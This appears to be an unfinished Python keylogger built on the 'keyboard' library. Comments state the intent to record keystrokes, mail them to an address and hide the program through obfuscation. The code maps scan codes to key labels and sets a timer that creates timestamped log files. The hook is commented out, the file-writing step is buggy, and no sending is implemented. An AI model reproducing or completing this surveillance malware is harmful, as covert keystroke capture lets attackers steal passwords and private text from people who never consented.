#python -m pip install keyboard
# Ide: Record key strokes
# Send to some mail address
# -  First: Save results every TIME seconds to txt file...
# Maybe hide itself using garbage, and encode everything as ascii?

import keyboard
import time
import threading

class Keylogger:
    def __init__(self):
        self.log = "" #How we create locals for classes
        self.filename = ""
        self.time = ""

    #def setLog(self, msg):
    #    self.log = msg

    def callback_function(self, event): #This function is called every time the on_release event happens (each time a key is lifted). Using the keyboard.hook gives for both UP and DOWN
        char = event.name
        char_code = event.scan_code

        print(event.scan_code)


        if char_code == 57: #Space
            self.log += ' '
        elif char_code == 28:
            self.log += '[ENTER]'
        elif char_code == 29:
            self.log += '[CTRL]'
        elif char_code == 56:
            self.log += '[ALT]'
        elif char_code == 15:
            self.log += '[TAB]'
        
        else:
            self.log += char

        #print(event.name)
        #print(self.log)
        
        if char == 'a':
            print(self.log)
   

    def getTime(self):
        self.time = time.ctime(time.time()).replace(' ', '_').replace(':', '_') #Format: Day_Month_Date_Time_Year

    def outputLog(self):
        threading.Timer(5.0, self.outputLog, self.getTime()).start()
        
        filename = "log_at_" + self.time + ".txt"
        #print("Filename: " + filename)
        f = open(filename, "x") 

    def startLogger(self):
        print("")
        #keyboard.on_release(self.callback_function)
        #keyboard.wait()





if __name__ == "__main__":
    keylogger = Keylogger()
    #keylogger.setLog("foo")
    #keylogger.getLog()
    keylogger.startLogger()
    keylogger.outputLog() #Testing action every 5 seconds
    


'''


def test(event):
    print("hello world")
    print(event.name)
    

keyboard.hook(test)


if __name__ == "__main__":

    keyboard.wait()
'''